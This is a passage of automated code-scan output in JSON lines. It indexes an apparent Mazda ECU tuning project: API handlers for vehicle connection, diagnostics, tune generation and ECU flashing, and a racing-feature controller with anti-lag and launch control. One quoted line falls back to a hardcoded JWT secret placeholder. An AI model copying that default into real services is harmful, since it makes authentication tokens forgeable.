"async def connect_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 616, "hardware": "vehicle", "content": "\"\"\"Connect to a vehicle.\"\"\""}, {"type": "hardware", "line": 621, "hardware": "vehicle", "content": "if \"vehicle_id\" not in data:"}, {"type": "hardware", "line": 622, "hardware": "vehicle", "content": "raise ValidationError(\"Vehicle ID is required\")"}, {"type": "hardware", "line": 624, "hardware": "vehicle", "content": "vehicle_id = data[\"vehicle_id\"]"}, {"type": "hardware", "line": 627, "hardware": "vehicle", "content": "vehicle = self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 632, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and not conn.is_expired),"}, {"type": "hardware", "line": 640, "hardware": "vehicle", "content": "\"vehicle_id\": existing_conn.vehicle_id,"}, {"type": "hardware", "line": 668, "hardware": "vehicle", "content": "connection = VehicleConnection("}, {"type": "hardware", "line": 670, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}, {"type": "hardware", "line": 681, "hardware": "vehicle", "content": "\"vehicle_id\": vehicle_id,"}, {"type": "hardware", "line": 687, "hardware": "vehicle", "content": "logger.error(f\"Failed to connect to vehicle: {e}\")"}, {"type": "hardware", "line": 688, "hardware": "vehicle", "content": "raise VehicleConnectionError(f\"Failed to connect to vehicle: {str(e)}\")"}, {"type": "hardware", "line": 690, "hardware": "vehicle", "content": "async def disconnect_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 691, "hardware": "vehicle", "content": "\"\"\"Disconnect from a vehicle.\"\"\""}, {"type": "hardware", "line": 693, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 696, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 701, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 711, "hardware": "vehicle", "content": "\"message\": \"Vehicle disconnected successfully\","}, {"type": "hardware", "line": 712, "hardware": "vehicle", "content": "\"vehicle_id\": vehicle_id"}, {"type": "hardware", "line": 716, "hardware": "vehicle", "content": "\"message\": \"No active connection found for this vehicle\","}, {"type": "hardware", "line": 717, "hardware": "vehicle", "content": "\"vehicle_id\": vehicle_id"}, {"type": "hardware", "line": 720, "hardware": "vehicle", "content": "async def list_vehicles(self, request: Request) -> Response:"}, {"type": "hardware", "line": 721, "hardware": "vehicle", "content": "\"\"\"List all vehicles for the current user.\"\"\""}, {"type": "hardware", "line": 726, "hardware": "vehicle", "content": "vehicles = self.db.get_all_vehicles()"}, {"type": "hardware", "line": 729, "hardware": "vehicle", "content": "vehicles = self.db.get_vehicles_by_owner(user.user_id)"}, {"type": "hardware", "line": 744, "hardware": "vehicle", "content": "for v in vehicles"}, {"type": "hardware", "line": 747, "hardware": "vehicle", "content": "async def get_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 748, "hardware": "vehicle", "content": "\"\"\"Get details for a specific vehicle.\"\"\""}, {"type": "hardware", "line": 750, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 753, "hardware": "vehicle", "content": "vehicle = self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 756, "hardware": "vehicle", "content": "\"id\": vehicle.id,"}, {"type": "hardware", "line": 757, "hardware": "vehicle", "content": "\"vin\": vehicle.vin,"}, {"type": "hardware", "line": 758, "hardware": "vehicle", "content": "\"make\": vehicle.make,"}, {"type": "hardware", "line": 759, "hardware": "vehicle", "content": "\"model\": vehicle.model,"}, {"type": "hardware", "line": 760, "hardware": "vehicle", "content": "\"year\": vehicle.year,"}, {"type": "hardware", "line": 761, "hardware": "vehicle", "content": "\"engine\": vehicle.engine,"}, {"type": "hardware", "line": 762, "hardware": "vehicle", "content": "\"owner_id\": vehicle.owner_id,"}, {"type": "hardware", "line": 763, "hardware": "vehicle", "content": "\"notes\": vehicle.notes,"}, {"type": "hardware", "line": 764, "hardware": "vehicle", "content": "\"created_at\": vehicle.created_at.isoformat(),"}, {"type": "hardware", "line": 765, "hardware": "vehicle", "content": "\"updated_at\": vehicle.updated_at.isoformat()"}, {"type": "hardware", "line": 768, "hardware": "vehicle", "content": "async def add_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 769, "hardware": "vehicle", "content": "\"\"\"Add a new vehicle.\"\"\""}, {"type": "hardware", "line": 780, "hardware": "vehicle", "content": "vehicle_id = self.db.add_vehicle("}, {"type": "hardware", "line": 791, "hardware": "vehicle", "content": "vehicle = self.db.get_vehicle(vehicle_id)"}, {"type": "hardware", "line": 794, "hardware": "vehicle", "content": "\"message\": \"Vehicle added successfully\","}, {"type": "hardware", "line": 795, "hardware": "vehicle", "content": "\"vehicle\": {"}, {"type": "hardware", "line": 796, "hardware": "vehicle", "content": "\"id\": vehicle.id,"}, {"type": "hardware", "line": 797, "hardware": "vehicle", "content": "\"vin\": vehicle.vin,"}, {"type": "hardware", "line": 798, "hardware": "vehicle", "content": "\"make\": vehicle.make,"}, {"type": "hardware", "line": 799, "hardware": "vehicle", "content": "\"model\": vehicle.model,"}, {"type": "hardware", "line": 800, "hardware": "vehicle", "content": "\"year\": vehicle.year,"}, {"type": "hardware", "line": 801, "hardware": "vehicle", "content": "\"engine\": vehicle.engine,"}, {"type": "hardware", "line": 802, "hardware": "vehicle", "content": "\"owner_id\": vehicle.owner_id,"}, {"type": "hardware", "line": 803, "hardware": "vehicle", "content": "\"notes\": vehicle.notes,"}, {"type": "hardware", "line": 804, "hardware": "vehicle", "content": "\"created_at\": vehicle.created_at.isoformat(),"}, {"type": "hardware", "line": 805, "hardware": "vehicle", "content": "\"updated_at\": vehicle.updated_at.isoformat()"}, {"type": "hardware", "line": 810, "hardware": "vehicle", "content": "raise APIError(f\"Failed to add vehicle: {str(e)}\", 400, \"ADD_VEHICLE_FAILED\")"}, {"type": "hardware", "line": 812, "hardware": "vehicle", "content": "async def update_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 813, "hardware": "vehicle", "content": "\"\"\"Update a vehicle's details.\"\"\""}, {"type": "hardware", "line": 815, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 819, "hardware": "vehicle", "content": "vehicle = self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 829, "hardware": "vehicle", "content": "success = self.db.update_vehicle(vehicle_id, **updates)"}, {"type": "hardware", "line": 831, "hardware": "vehicle", "content": "raise APIError(\"Failed to update vehicle\")"}, {"type": "hardware", "line": 834, "hardware": "vehicle", "content": "updated_vehicle = self.db.get_vehicle(vehicle_id)"}, {"type": "hardware", "line": 837, "hardware": "vehicle", "content": "\"message\": \"Vehicle updated successfully\","}, {"type": "hardware", "line": 838, "hardware": "vehicle", "content": "\"vehicle\": {"}, {"type": "hardware", "line": 839, "hardware": "vehicle", "content": "\"id\": updated_vehicle.id,"}, {"type": "hardware", "line": 840, "hardware": "vehicle", "content": "\"vin\": updated_vehicle.vin,"}, {"type": "hardware", "line": 841, "hardware": "vehicle", "content": "\"make\": updated_vehicle.make,"}, {"type": "hardware", "line": 842, "hardware": "vehicle", "content": "\"model\": updated_vehicle.model,"}, {"type": "hardware", "line": 843, "hardware": "vehicle", "content": "\"year\": updated_vehicle.year,"}, {"type": "hardware", "line": 844, "hardware": "vehicle", "content": "\"engine\": updated_vehicle.engine,"}, {"type": "hardware", "line": 845, "hardware": "vehicle", "content": "\"owner_id\": updated_vehicle.owner_id,"}, {"type": "hardware", "line": 846, "hardware": "vehicle", "content": "\"notes\": updated_vehicle.notes,"}, {"type": "hardware", "line": 847, "hardware": "vehicle", "content": "\"created_at\": updated_vehicle.created_at.isoformat(),"}, {"type": "hardware", "line": 848, "hardware": "vehicle", "content": "\"updated_at\": updated_vehicle.updated_at.isoformat()"}, {"type": "hardware", "line": 852, "hardware": "vehicle", "content": "async def delete_vehicle(self, request: Request) -> Response:"}, {"type": "hardware", "line": 853, "hardware": "vehicle", "content": "\"\"\"Delete a vehicle.\"\"\""}, {"type": "hardware", "line": 855, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 858, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 861, "hardware": "vehicle", "content": "success = self.db.delete_vehicle(vehicle_id)"}, {"type": "hardware", "line": 863, "hardware": "vehicle", "content": "raise APIError(\"Failed to delete vehicle\")"}, {"type": "hardware", "line": 866, "hardware": "vehicle", "content": "\"message\": \"Vehicle deleted successfully\","}, {"type": "hardware", "line": 867, "hardware": "vehicle", "content": "\"vehicle_id\": vehicle_id"}, {"type": "hardware", "line": 872, "hardware": "vehicle", "content": "\"\"\"Perform a diagnostic scan on a vehicle.\"\"\""}, {"type": "hardware", "line": 874, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 877, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 882, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 887, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle\")"}, {"type": "hardware", "line": 896, "hardware": "vehicle", "content": "session_id = await self._create_diagnostic_session(vehicle_id, user.user_id)"}, {"type": "hardware", "line": 920, "hardware": "vehicle", "content": "\"\"\"Clear diagnostic trouble codes for a vehicle.\"\"\""}, {"type": "hardware", "line": 922, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 925, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 930, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 935, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle\")"}, {"type": "hardware", "line": 942, "hardware": "ECU", "content": "self.db.log_security_event("}, {"type": "hardware", "line": 945, "hardware": "vehicle", "content": "description=f\"Cleared DTCs for vehicle {vehicle_id}\","}, {"type": "hardware", "line": 959, "hardware": "vehicle", "content": "\"\"\"Get diagnostic logs for a vehicle.\"\"\""}, {"type": "hardware", "line": 961, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 964, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 973, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}, {"type": "hardware", "line": 994, "hardware": "vehicle", "content": "\"\"\"Generate a base tune for a vehicle.\"\"\""}, {"type": "hardware", "line": 996, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 1000, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 1005, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 1010, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle\")"}, {"type": "hardware", "line": 1014, "hardware": "vehicle", "content": "vehicle_params = await connection.can_engine.read_parameters([\"rpm\", \"load\", \"ignition_timing\"])"}, {"type": "hardware", "line": 1022, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}, {"type": "hardware", "line": 1027, "hardware": "vehicle", "content": "\"parameters\": vehicle_params,"}, {"type": "hardware", "line": 1035, "hardware": "vehicle", "content": "\"advance\": vehicle_params.get(\"ignition_timing\", 10.0),"}, {"type": "hardware", "line": 1087, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 1091, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 1096, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 1101, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle or AI tuner not available\")"}, {"type": "hardware", "line": 1114, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}, {"type": "hardware", "line": 1145, "hardware": "ECU", "content": "\"\"\"Flash a tune to the vehicle's ECU.\"\"\""}, {"type": "hardware", "line": 1145, "hardware": "vehicle", "content": "\"\"\"Flash a tune to the vehicle's ECU.\"\"\""}, {"type": "hardware", "line": 1147, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 1151, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 1156, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 1161, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle\")"}, {"type": "hardware", "line": 1181, "hardware": "ECU", "content": "self.db.log_security_event("}, {"type": "hardware", "line": 1184, "hardware": "vehicle", "content": "description=f\"Flashed tune {tune_id} to vehicle {vehicle_id}\","}, {"type": "hardware", "line": 1200, "hardware": "vehicle", "content": "\"\"\"List all tunes for a vehicle.\"\"\""}, {"type": "hardware", "line": 1202, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 1205, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 1209, "hardware": "vehicle", "content": "tunes = self._get_vehicle_tunes(vehicle_id)"}, {"type": "hardware", "line": 1241, "hardware": "vehicle", "content": "\"\"\"Stream real-time data from the vehicle.\"\"\"n        user = await self.get_current_user(request)"}, {"type": "hardware", "line": 1242, "hardware": "vehicle", "content": "vehicle_id = int(request.match_info[\"vehicle_id\"])"}, {"type": "hardware", "line": 1245, "hardware": "vehicle", "content": "self._validate_vehicle_ownership(user, vehicle_id)"}, {"type": "hardware", "line": 1250, "hardware": "vehicle", "content": "if conn.vehicle_id == vehicle_id and conn.user_id == user.user_id),"}, {"type": "hardware", "line": 1255, "hardware": "vehicle", "content": "raise VehicleConnectionError(\"No active connection to the vehicle\")"}, {"type": "hardware", "line": 1347, "hardware": "vehicle", "content": "\"vehicle_id\": connection.vehicle_id,"}, {"type": "hardware", "line": 1388, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1440, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1449, "hardware": "vehicle", "content": "\"message\": \"Not connected to vehicle\""}, {"type": "hardware", "line": 1483, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1501, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1527, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1533, "hardware": "vehicle", "content": "\"vehicle_id\": connection.vehicle_id,"}, {"type": "hardware", "line": 1542, "hardware": "vehicle", "content": "\"vehicle_info\": await connection.can_engine.get_vehicle_info(),"}, {"type": "hardware", "line": 1586, "hardware": "vehicle", "content": "def _get_vehicle_tunes(self, vehicle_id: int) -> List[Dict[str, Any]]:"}, {"type": "hardware", "line": 1587, "hardware": "vehicle", "content": "\"\"\"Get all tunes for a vehicle.\"\"\""}, {"type": "hardware", "line": 1623, "hardware": "vehicle", "content": "\"\"\"Clean up inactive vehicle connections.\"\"\""}, {"type": "hardware", "line": 1643, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1744, "hardware": "vehicle", "content": "connection: VehicleConnection,"}, {"type": "hardware", "line": 1769, "hardware": "vehicle", "content": "vehicle_id: int,"}, {"type": "hardware", "line": 1775, "hardware": "vehicle", "content": "vehicle_id=vehicle_id,"}], "security_logic": [{"type": "security_pattern", "line": 49, "pattern": "key", "content": "JWT_SECRET = os.getenv(\"JWT_SECRET\", \"your-secret-key-change-in-production\")"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "JWT_ALGORITHM = \"HS256\""}, {"type": "security_pattern", "line": 71, "pattern": "authorization", "content": "\"\"\"Authentication/authorization error.\"\"\""}, {"type": "security_pattern", "line": 217, "pattern": "key", "content": "secret_key = Fernet.generate_key()"}, {"type": "security_pattern", "line": 220, "pattern": "key", "content": "aiohttp_session.cookie_storage.EncryptedCookieStorage(secret_key)"}, {"type": "security_pattern", "line": 220, "pattern": "encrypt", "content": "aiohttp_session.cookie_storage.EncryptedCookieStorage(secret_key)"}, {"type": "security_pattern", "line": 235, "pattern": "authorization", "content": "response.headers[\"Access-Control-Allow-Headers\"] = \"Content-Type, Authorization\""}, {"type": "security_pattern", "line": 332, "pattern": "authenticate", "content": "\"\"\"Get the current authenticated user from the request.\"\"\""}, {"type": "security_pattern", "line": 338, "pattern": "algorithm", "content": "payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])"}, {"type": "security_pattern", "line": 376, "pattern": "authorization", "content": "auth_header = request.headers.get(\"Authorization\")"}, {"type": "security_pattern", "line": 397, "pattern": "algorithm", "content": "return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)"}, {"type": "security_pattern", "line": 431, "pattern": "password", "content": "required_fields = [\"username\", \"email\", \"password\", \"first_name\", \"last_name\"]"}, {"type": "security_pattern", "line": 439, "pattern": "password", "content": "password=data[\"password\"],"}, {"type": "security_pattern", "line": 467, "pattern": "authenticate", "content": "\"\"\"Authenticate a user and return a JWT token.\"\"\""}, {"type": "security_pattern", "line": 471, "pattern": "password", "content": "if \"username\" not in data or \"password\" not in data:"}, {"type": "security_pattern", "line": 472, "pattern": "password", "content": "raise ValidationError(\"Username and password are required\")"}, {"type": "security_pattern", "line": 475, "pattern": "authenticate", "content": "user = self.db.authenticate_user("}, {"type": "security_pattern", "line": 477, "pattern": "password", "content": "password=data[\"password\"],"}, {"type": "security_pattern", "line": 482, "pattern": "password", "content": "raise AuthError(\"Invalid username or password\")"}, {"type": "security_pattern", "line": 524, "pattern": "algorithm", "content": "algorithms=[JWT_ALGORITHM],"}, {"type": "security_pattern", "line": 571, "pattern": "authenticate", "content": "\"\"\"Get the current authenticated user's profile.\"\"\""}, {"type": "security_pattern", "line": 588, "pattern": "password", "content": "allowed_fields = [\"email\", \"first_name\", \"last_name\", \"password\"]"}, {"type": "security_pattern", "line": 1901, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "README.md", "lines_read": 190, "features_found": [{"type": "url_found", "count": 1}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "RacingFeatureController.py", "lines_read": 1015, "features_found": [{"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "update", "line": 38}, {"type": "function", "name": "to_dict", "line": 47}, {"type": "function", "name": "__init__", "line": 143}, {"type": "function", "name": "update_config", "line": 223}, {"type": "function", "name": "get_status", "line": 245}, {"type": "function", "name": "add_callback", "line": 249}, {"type": "function", "name": "remove_callback", "line": 254}, {"type": "function", "name": "_check_launch_conditions", "line": 605}, {"type": "function", "name": "_check_flat_shift_conditions", "line": 613}, {"type": "function", "name": "_check_anti_lag_conditions", "line": 622}, {"type": "function", "name": "_check_pop_bang_conditions", "line": 631}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "MazdaCANEngine", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}, {"type": "import", "module": "asyncio", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "MazdaCANEngine", "line": null}, {"type": "import", "module": "MazdaSecurityCore", "line": null}], "components_found": [{"type": "class", "name": "FeatureState", "line": 22}, {"type": "class", "name": "FeatureStatus", "line": 29}, {"type": "class", "name": "LaunchControlMode", "line": 57}, {"type": "class", "name": "AntiLagMode", "line": 65}, {"type": "class", "name": "TwoStepMode", "line": 73}, {"type": "class", "name": "RacingFeatureConfig", "line": 81}, {"type": "class", "name": "RacingFeatureController", "line": 140}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "UDS", "content": "flat-shift, anti-lag, and more, with clean UDS implementation for Mazda vehicles."}, {"type": "protocol", "line": 15, "protocol": "CAN", "content": "from MazdaCANEngine import MazdaCANEngine"}, {"type": "protocol", "line": 143, "protocol": "CAN", "content": "def __init__(self, can_engine: MazdaCANEngine, security_core: MazdaSecurityCore):"}, {"type": "protocol", "line": 974, "protocol": "CAN", "content": "can_engine = MazdaCANEngine()"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "flat-shift, anti-lag, and more, with clean UDS implementation for Mazda vehicles."}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "from MazdaSecurityCore import MazdaSecurityCore"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "def __init__(self, can_engine: MazdaCANEngine, security_core: MazdaSecurityCore):"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "self.security_core = security_core"}, {"type": "hardware", "line": 162, "hardware": "vehicle", "content": "self._vehicle_state = {"}, {"type": "hardware", "line": 200, "hardware": "vehicle", "content": "asyncio.create_task(self._monitor_vehicle_state()),"}, {"type": "hardware", "line": 236, "hardware": "vehicle", "content": "self._vehicle_state[\"anti_lag_active\"] = False"}, {"type": "hardware", "line": 243, "hardware": "vehicle", "content": "self._vehicle_state[\"two_step_active\"] = False"}, {"type": "hardware", "line": 267, "hardware": "vehicle", "content": "if self._vehicle_state[\"speed\"] > 5:  # km/h"}, {"type": "hardware", "line": 270, "hardware": "vehicle", "content": "if self._vehicle_state[\"rpm\"] > 1500:"}, {"type": "hardware", "line": 288, "hardware": "vehicle", "content": "self._vehicle_state[\"launch_active\"] = True"}, {"type": "hardware", "line": 295, "hardware": "vehicle", "content": "\"rpm\": self._vehicle_state[\"rpm\"],"}, {"type": "hardware", "line": 296, "hardware": "vehicle", "content": "\"throttle\": self._vehicle_state[\"throttle_pos\"]"}, {"type": "hardware", "line": 305, "hardware": "vehicle", "content": "self._vehicle_state[\"launch_active\"] = False"}, {"type": "hardware", "line": 325, "hardware": "vehicle", "content": "self._vehicle_state[\"flat_shift_active\"] = True"}, {"type": "hardware", "line": 332, "hardware": "vehicle", "content": "\"rpm\": self._vehicle_state[\"rpm\"],"}, {"type": "hardware", "line": 333, "hardware": "vehicle", "content": "\"gear\": self._vehicle_state[\"gear\"]"}, {"type": "hardware", "line": 342, "hardware": "vehicle", "content": "self._vehicle_state[\"flat_shift_active\"] = False"}, {"type": "hardware", "line": 360, "hardware": "vehicle", "content": "self._vehicle_state[\"anti_lag_active\"] = True"}, {"type": "hardware", "line": 368, "hardware": "vehicle", "content": "\"rpm\": self._vehicle_state[\"rpm\"]"}, {"type": "hardware", "line": 377, "hardware": "vehicle", "content": "self._vehicle_state[\"anti_lag_active\"] = False"}, {"type": "hardware", "line": 399, "hardware": "vehicle", "content": "\"rpm\": self._vehicle_state[\"rpm\"],"}, {"type": "hardware", "line": 400, "hardware": "vehicle", "content": "\"throttle\": self._vehicle_state[\"throttle_pos\"]"}, {"type": "hardware", "line": 419, "hardware": "vehicle", "content": "self._vehicle_state[\"two_step_active\"] = True"}, {"type": "hardware", "line": 420, "hardware": "vehicle", "content": "self._vehicle_state[\"two_step_mode\"] = mode"}, {"type": "hardware", "line": 431, "hardware": "vehicle", "content": "self._vehicle_state[\"two_step_active\"] = False"}, {"type": "hardware", "line": 452, "hardware": "vehicle", "content": "async def _monitor_vehicle_state(self) -> None:"}, {"type": "hardware", "line": 453, "hardware": "vehicle", "content": "\"\"\"Monitor vehicle state and trigger features as needed.\"\"\""}, {"type": "hardware", "line": 464, "hardware": "vehicle", "content": "self._vehicle_state.update({"}, {"type": "hardware", "line": 484, "hardware": "vehicle", "content": "logger.error(f\"Error in vehicle state monitor: {e}\")"}, {"type": "hardware", "line": 522, "hardware": "vehicle", "content": "if (self._vehicle_state[\"throttle_pos\"] > 90 and"}, {"type": "hardware", "line": 523, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] > self.config.launch_rpm * 0.8 and"}, {"type": "hardware", "line": 524, "hardware": "vehicle", "content": "self._vehicle_state[\"clutch\"] and"}, {"type": "hardware", "line": 525, "hardware": "vehicle", "content": "self._vehicle_state[\"speed\"] < 5):"}, {"type": "hardware", "line": 530, "hardware": "vehicle", "content": "if (self._vehicle_state[\"speed\"] > 30 or"}, {"type": "hardware", "line": 531, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] < 10):"}, {"type": "hardware", "line": 543, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] > 90 and"}, {"type": "hardware", "line": 544, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] > self.config.flat_shift_rpm * 0.9 and"}, {"type": "hardware", "line": 545, "hardware": "vehicle", "content": "self._vehicle_state[\"clutch\"] and"}, {"type": "hardware", "line": 546, "hardware": "vehicle", "content": "self._vehicle_state[\"gear\"] > 0):"}, {"type": "hardware", "line": 550, "hardware": "vehicle", "content": "elif state == FeatureState.ACTIVE and not self._vehicle_state[\"clutch\"]:"}, {"type": "hardware", "line": 575, "hardware": "vehicle", "content": "if (self._vehicle_state[\"throttle_pos\"] < 10 and"}, {"type": "hardware", "line": 576, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] > self.config.pop_bang_rpm_min and"}, {"type": "hardware", "line": 577, "hardware": "vehicle", "content": "self._vehicle_state[\"speed\"] > self.config.pop_bang_min_speed):"}, {"type": "hardware", "line": 598, "hardware": "vehicle", "content": "current_mode = self._vehicle_state.get(\"two_step_mode\")"}, {"type": "hardware", "line": 608, "hardware": "vehicle", "content": "self._vehicle_state[\"speed\"] < 5 and"}, {"type": "hardware", "line": 609, "hardware": "vehicle", "content": "self._vehicle_state[\"clutch\"] and"}, {"type": "hardware", "line": 610, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] > 90"}, {"type": "hardware", "line": 616, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] > self.config.flat_shift_rpm * 0.9 and"}, {"type": "hardware", "line": 617, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] > 90 and"}, {"type": "hardware", "line": 618, "hardware": "vehicle", "content": "self._vehicle_state[\"clutch\"] and"}, {"type": "hardware", "line": 619, "hardware": "vehicle", "content": "self._vehicle_state[\"gear\"] > 0"}, {"type": "hardware", "line": 625, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] >= self.config.anti_lag_rpm_min and"}, {"type": "hardware", "line": 626, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] <= self.config.anti_lag_rpm_max and"}, {"type": "hardware", "line": 627, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] < self.config.anti_lag_throttle_threshold and"}, {"type": "hardware", "line": 628, "hardware": "vehicle", "content": "self._vehicle_state[\"boost_psi\"] < 5.0  # Only activate at low boost"}, {"type": "hardware", "line": 634, "hardware": "vehicle", "content": "self._vehicle_state[\"rpm\"] >= self.config.pop_bang_rpm_min and"}, {"type": "hardware", "line": 635, "hardware": "vehicle", "content": "self._vehicle_state[\"speed\"] >= self.config.pop_bang_min_speed and"}, {"type": "hardware", "line": 636, "hardware": "vehicle", "content": "self._vehicle_state[\"throttle_pos\"] < 10  # On throttle lift-off"}, {"type": "hardware", "line": 642, "hardware": "vehicle", "content": "if self._vehicle_state[\"rpm\"] > self.config.max_engine_rpm:"}, {"type": "hardware", "line": 643, "hardware": "vehicle", "content": "await self._handle_fault(\"over_rev\", f\"Engine over-rev: {self._vehicle_state['rpm']} RPM\")"}, {"type": "hardware", "line": 646, "hardware": "vehicle", "content": "if self._vehicle_state[\"boost_psi\"] > self.config.max_boost_psi:"}, {"type": "hardware", "line": 647, "hardware": "vehicle", "content": "await self._handle_fault(\"over_boost\", f\"Over-boost: {self._vehicle_state['boost_psi']} psi\")"}, {"type": "hardware", "line": 650, "hardware": "vehicle", "content": "if self._vehicle_state[\"oil_temp\"] > self.config.oil_temp_limit_c:"}, {"type": "hardware", "line": 651, "hardware": "vehicle", "content": "await self._handle_fault(\"high_oil_temp\", f\"High oil temperature: {self._vehicle_state['oil_temp']}\u00b0"}, {"type": "hardware", "line": 653, "hardware": "vehicle", "content": "if self._vehicle_state[\"coolant_temp\"] > self.config.coolant_temp_limit_c:"}, {"type": "hardware", "line": 654, "hardware": "vehicle", "content": "await self._handle_fault(\"high_coolant_temp\", f\"High coolant temperature: {self._vehicle_state['cool"}, {"type": "hardware", "line": 657, "hardware": "vehicle", "content": "if (self._vehicle_state[\"afr\"] < self.config.afr_safety_min or"}, {"type": "hardware", "line": 658, "hardware": "vehicle", "content": "self._vehicle_state[\"afr\"] > self.config.afr_safety_max):"}, {"type": "hardware", "line": 659, "hardware": "vehicle", "content": "await self._handle_fault(\"unsafe_afr\", f\"Unsafe AFR: {self._vehicle_state['afr']}\")"}, {"type": "hardware", "line": 683, "hardware": "ECU", "content": "\"\"\"Apply launch control parameters to the ECU.\"\"\""}, {"type": "hardware", "line": 730, "hardware": "ECU", "content": 